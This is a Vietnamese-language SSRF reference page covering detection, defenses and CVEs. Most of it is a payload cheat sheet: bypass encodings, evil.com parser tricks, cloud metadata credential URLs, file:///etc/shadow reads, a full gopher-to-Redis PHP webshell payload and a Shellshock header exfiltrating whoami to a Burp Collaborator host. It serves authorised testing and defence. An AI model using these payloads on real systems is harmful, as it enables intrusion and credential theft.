# Server-Side Request Forgery (SSRF)

> Máy chủ bị ép thực hiện request tới các đích nội bộ do kẻ tấn công chỉ định. **Tài liệu chuyên
> sâu:** [`Troubleshooting_Guide/ssrf.md`](../../../../Troubleshooting_Guide/ssrf.md) ·
> **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** SSRF · A10:2021 Server-Side Request Forgery
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
SSRF xảy ra khi ứng dụng nhận một URL (hoặc host/IP) từ người dùng và tự thực hiện request đó ở phía
máy chủ, cho phép kẻ tấn công trỏ request tới các hệ thống mà máy chủ truy cập được nhưng họ thì
không — dịch vụ nội bộ, endpoint metadata của cloud, hoặc giao diện loopback.

## Cơ chế hoạt động (How it works)
Một tính năng như "import từ URL", webhook, trình render PDF, hoặc tải ảnh nhận vào một URL. Kẻ tấn
công cung cấp `http://169.254.169.254/…` (metadata cloud), `http://127.0.0.1:6379/` (Redis nội bộ),
hoặc scheme `file://`. Máy chủ thực hiện request với vị trí mạng — và thường là thông tin xác thực —
của chính nó. SSRF mù (blind) được phát hiện qua callback out-of-band.

## Tác động (Impact)
Đọc thông tin xác thực của instance cloud (kinh điển: đánh cắp metadata IMDSv1 → chiếm tài khoản),
truy cập trang quản trị và cơ sở dữ liệu nội bộ, quét cổng mạng nội bộ, gọi các API nội bộ không xác
thực, và đôi khi leo thang thành RCE đối với dịch vụ nội bộ.

## Cách phát hiện (How to detect)
- Bất kỳ tham số nào chứa URL, hostname, hoặc IP mà máy chủ sau đó đi tải.
- Tương tác out-of-band (Burp Collaborator / log DNS của bạn) khi trỏ tới một domain bạn kiểm soát —
  chứng minh SSRF mù.
- Khác biệt phản hồi/độ trễ giữa cổng nội bộ truy cập được và không truy cập được.

## Khai thác (tóm tắt) (Exploitation)
Xác nhận việc fetch bằng một "canary" out-of-band, rồi liệt kê các đích nội bộ (loopback, dải
RFC1918, IP metadata). Vượt bộ lọc yếu bằng mã hóa thay thế, redirect, DNS rebinding, `[::]`, IP
dạng thập phân/bát phân, hoặc mẹo `@` trong phần authority. Leo thang qua các dịch vụ truy cập được.
Kỹ thuật đầy đủ nằm trong tài liệu chuyên sâu.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Xác nhận việc fetch (Confirming the fetch)
Tiêm cơ bản vào một tham số fetch URL, rồi leo thang sang các hành động nội bộ có xác thực.

```http
POST /product/stock HTTP/1.1
Host: vulnerable-website.com

stockApi=http://localhost/admin
```

```http
stockApi=http://localhost/admin/delete?username=carlos
```

SSRF mù: trỏ một "canary" out-of-band tới một domain bạn kiểm soát (`Referer` là một sink phổ biến).

```http
GET /product?productId=1 HTTP/1.1
Host: vulnerable-website.com
Referer: http://burpcollaborator.net
```

```http
POST /product/stock HTTP/1.1
stockApi=http://YOUR-COLLABORATOR-DOMAIN.burpcollaborator.net
```

### Vượt loopback / danh sách đen (Loopback / blacklist bypass)
Các cách biểu diễn thay thế của `127.0.0.1` / `localhost` để đánh bại bộ lọc chuỗi ngây thơ.

```text
http://127.1/admin
http://127.0.0.1/admin
http://2130706433/admin        # decimal IP
http://0x7f.0x0.0x0.0x1/admin  # hex IP
http://0177.0.0.1/admin        # octal IP
http://[::1]/
http://localhost.localdomain/
```

Mã hóa URL hai lần phần path giúp đưa một từ khóa bị chặn lọt qua bộ lọc:

```text
stockApi=http://127.1/%2561dmin   # %2561 → %61 → 'a' (admin)
```

Loopback dựa trên DNS (cũng hữu ích cho rebinding):

```text
http://localtest.me/
http://127.0.0.1.nip.io/
```

### Vượt whitelist qua phân tích authority (Whitelist bypass via authority parsing)
Khai thác khoảng chênh giữa cái mà bộ kiểm tra phân tích và cái mà HTTP client thực sự kết nối tới.

```text
http://expected-domain@evil.com      # connects to evil.com
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

Với mẹo fragment, `%2523` là dấu `#` đã mã hóa hai lần: bộ kiểm tra thấy `stock.weliketoshop.net` (đã whitelist) trong khi máy chủ kết nối tới `localhost:80` sau khi phần fragment bị cắt bỏ.

Các khác biệt của bộ phân tích URL (URL-parser differentials) đáng thử:

```python
url = "http://expected.com@evil.com/"      # credentials confusion
url = "http://localhost:80#@expected.com/" # fragment confusion
url = "http://expected.com%00.evil.com/"   # null-byte injection
url = "http://expected.com@еvil.com/"       # Unicode (Cyrillic 'е') confusion
```

### SSRF qua open redirect (SSRF via open redirect)
Khi bộ fetch chỉ cho phép path cùng origin, hãy nối chuỗi một open redirect trên site để vươn tới host nội bộ.

```text
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

### Dịch vụ metadata cloud (Cloud metadata services)
Đích nội bộ có tác động cao nhất — thông tin xác thực của instance và user-data.

```text
# AWS EC2 (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# AWS IMDSv2 (token-gated)
POST http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
GET  http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: TOKEN

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Oracle Cloud
http://169.254.169.254/opc/v2/instance/
```

Nếu `169.254.169.254` bị lọc, thử mã hóa thay thế hoặc bí danh DNS:

```text
http://[::ffff:169.254.169.254]/
http://0xa9fea9fe/
http://2852039166/
http://0251.0376.0251.0376/
http://169.254.169.254.nip.io/
http://metadata.google.internal/
```

### Smuggling giao thức (Protocol smuggling)
Các scheme không phải HTTP đọc file hoặc trực tiếp giao tiếp với dịch vụ nội bộ.

```text
# file:// — read local files
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///var/www/html/config.php

# dict:// — probe services
dict://internal:11211/stats   # Memcached
dict://internal:6379/info     # Redis

# gopher:// — send arbitrary TCP bytes
gopher://internal:3306/_...   # MySQL
gopher://internal:6379/_...   # Redis
gopher://internal:25/_...     # SMTP

# others
ldap://internal:389/dc=example,dc=com
tftp://internal/config.txt
```

Gopher → Redis là phép xoay trục SSRF-sang-RCE kinh điển (ghi một webshell qua `CONFIG SET dir`/`dbfilename`):

```text
gopher://redis:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%3c%3fphp%20system%28%24_GET%5b%27cmd%27%5d%29%3b%20%3f%3e%0a%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a*1%0d%0a$4%0d%0aQUIT%0d%0a
```

### Leo thang SSRF mù (Blind SSRF escalation)
Khi không có phản hồi hiển thị, suy luận trạng thái nội bộ từ thời gian/lỗi, hoặc xoay trục sang RCE trên phần mềm có lỗ hổng.

```python
# Port scanning by timing
stockApi=http://192.168.1.1:22    # open  → quick response
stockApi=http://192.168.1.1:9999  # closed → timeout/slow

# Error-based port detection (http://192.168.1.1:80)
# "Connection refused" → port closed
# "HTTP parse error"   → port open, not HTTP
# valid data           → open HTTP service
```

Shellshock nhắm vào một host CGI nội bộ chỉ máy chủ truy cập được:

```bash
() { :; }; /usr/bin/nslookup $(whoami).burpcollaborator.net
```

```http
GET /product?productId=1 HTTP/1.1
Host: vulnerable-website.com
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR.net
Referer: http://192.168.0.1:8080
```

### SSRF qua bộ phân tích (XXE / SVG) (SSRF through parsers)
Các endpoint tải file và XML vươn tới mạng thông qua việc tải entity/resource.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal/admin">
]>
<data>&xxe;</data>

<!-- variants -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://internal/admin" />
  <image href="file:///etc/passwd" />
  <style>@import url('http://internal/style.css');</style>
  <script href="http://internal/malicious.js"></script>
</svg>
```

### Thứ tự thử bypass (Bypass test order)
Một thang leo thang thực dụng khi fuzz một tham số duy nhất:

| Thử | Payload | Đích |
|-----|---------|---------|
| 1 | `http://localhost/` | cho phép localhost ngây thơ |
| 2 | `http://127.0.0.1/` | loopback dotted-quad |
| 3 | `http://127.1/` | loopback dạng rút gọn |
| 4 | `http://0x7f.0.0.1/` | vượt lọc octet hex |
| 5 | `http://2130706433/` | vượt lọc IP thập phân |
| 6 | `http://[::1]/` | loopback IPv6 |
| 7 | `http://localhost.localdomain/` | bí danh hostname |
| 8 | `http://localtest.me/`, `http://127.0.0.1.nip.io/` | DNS rebinding |

## Phòng chống (Defenses)
1. **Danh sách cho phép (allow-list)** host/scheme đích; mặc định từ chối.
2. Phân giải và kiểm tra IP *sau* khi DNS, chặn dải private/link-local (và kiểm tra lại khi có
   redirect để chống rebinding/TOCTOU).
3. Tắt các scheme không dùng (`file://`, `gopher://`, `dict://`).
4. Bắt buộc IMDSv2 / loại bỏ phụ thuộc vào instance metadata; phân vùng mạng nội bộ.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Server-Side+Request+Forgery
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=SSRF
- **Exploit-DB** — https://www.exploit-db.com/search?q=SSRF
- **GitHub Advisories** — https://github.com/advisories?query=ssrf
- **OSV** — https://osv.dev/list?q=ssrf
- **Cộng đồng** — r/netsec, HackerOne (`weakness:"Server-Side Request Forgery (SSRF)"`), blog
  bảo mật cloud (lạm dụng metadata).
- _Mẹo tìm kiếm: nhắm vào các tính năng tải URL và gateway:_ `"<sản phẩm>" SSRF metadata`.

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2021-26855` — SSRF "ProxyLogon" trong Microsoft Exchange, không cần xác thực, nối chuỗi tới
  RCE; bị khai thác hàng loạt.
- `CVE-2021-22054` — SSRF trong VMware Workspace ONE UEM.
- _Sự cố kinh điển: vụ rò rỉ Capital One năm 2019 lạm dụng SSRF để đọc thông tin xác thực AWS IMDS._

## Tham khảo (References)
- PortSwigger Web Security Academy — SSRF.
- OWASP — Server-Side Request Forgery Prevention Cheat Sheet.
